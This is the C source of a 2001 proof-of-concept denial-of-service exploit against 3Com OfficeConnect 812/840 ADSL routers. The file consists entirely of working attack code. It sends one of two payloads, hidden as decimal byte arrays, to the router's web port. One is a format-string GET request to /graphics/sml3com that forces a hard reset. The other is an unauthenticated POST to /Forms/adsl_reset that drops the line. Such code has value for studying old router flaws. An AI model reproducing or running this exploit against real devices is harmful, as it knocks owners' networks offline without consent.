// 3Com OfficeConnect 812/840 ADSL Router Denial of Service (maybe others)
// Proof of concept, soft and hard reset, the security is weak
// Written pour sniffer <sniffer@sniffer.net> 
// Fri Sep 21 15:51:35 BRT 2001
// Viva Brazil!

#include <stdio.h>
#include <string.h>
#include <errno.h>
#include <stdlib.h>
#include <unistd.h>
#include <netdb.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <netinet/in.h>

void 
usage(binary)
char *binary;
{
fprintf(stderr,"3Com OfficeConnect 812 ADSL Router Denial of Service (%s)\nsniffer <sniffer@sniffer.net>\n\t%s <1 (soft) || 2 (hard)> <remote router>\n", __FILE__, binary);
}
int
main(argc, argv)
int argc;
char **argv;
{
int sockfd;
char senddata[1024];
char hardreset_data[] = { 
									 71,69,84,32,47,103,114,97,112,104,105,99,115,
                   47,115,109,108,51,99,111,109,37,115,37,115,37,
                   115,37,115,37,115,37,115,37,115,37,115,37,115,
                   37,115,37,115,37,115,37,115,37,115,37,115,37,
                   115,37,115,37,115,37,115,37,115,37,115,37,115,
                   37,115,37,115,37,115,37,115,37,115,37,115,37,
                   115,37,115,37,115,37,115,37,115,37,115,37,115,
                   37,115,37,115,37,115,37,115,37,115,37,115,37,
                   115,37,115,37,115,37,115,37,115,37,115,37,115,
                   37,115,37,115,37,115,37,115,37,115,37,115,37,
                   115,37,115,37,115,37,115,37,115,37,115,37,115,
                   37,115,37,115,37,115,37,115,32,72,84,84,80,
                   47,49,46,48,10,10,0 };
char softreset_data[] = {
                   80,79,83,84,32,47,70,111,114,109,115,47,97,
                   100,115,108,95,114,101,115,101,116,32,72,84,84,
                   80,47,49,46,49,10,72,111,115,116,58,32,49,
                   57,50,46,49,54,56,46,49,46,50,53,52,10,
                   67,111,110,110,101,99,116,105,111,110,58,32,99,
                   108,111,115,101,10,67,111,110,116,101,110,116,45,
                   76,101,110,103,116,104,58,32,49,57,10,10,83,
                   117,98,109,105,116,61,82,101,115,101,116,37,50,
                   48,76,105,110,101,10,10,0 };
struct hostent *he;
struct sockaddr_in their_addr;
								
if( argc != 3 )
{
	usage(argv[0]);
	exit(0);
}
if( atoi(argv[1]) >= 3 || atoi(argv[1]) == 0 )
{
	  usage(argv[0]);
		exit(0);	
}
if((he=gethostbyname(argv[2])) == NULL)
{
	herror("gethostbyname");
	exit(1);
}

their_addr.sin_family = AF_INET;
their_addr.sin_port = htons(80);
their_addr.sin_addr = (*(struct in_addr *)he->h_addr);
bzero(&their_addr.sin_zero, 8);

if ((sockfd=socket(AF_INET, SOCK_STREAM, 0)) == -1) 
{
	perror("socket");
	exit(1);
}

if(connect(sockfd, (struct sockaddr *)&their_addr, sizeof(struct sockaddr)) == -1) 
{
	perror("connect");
	exit(1);
}
else
{
	printf("connected\n");
}
if(atoi(argv[1]) == 1)
	strncpy(senddata, softreset_data, strlen(softreset_data));
else if(atoi(argv[1]) == 2)
	strncpy(senddata, hardreset_data, strlen(hardreset_data));

if(send(sockfd, senddata, sizeof(senddata), 0) == -1) 
{
	perror("send");
	exit(1);
}
else
{
	printf("evil data sent\n.. have a rice day\n");
}

close(sockfd);
return(0);				
}
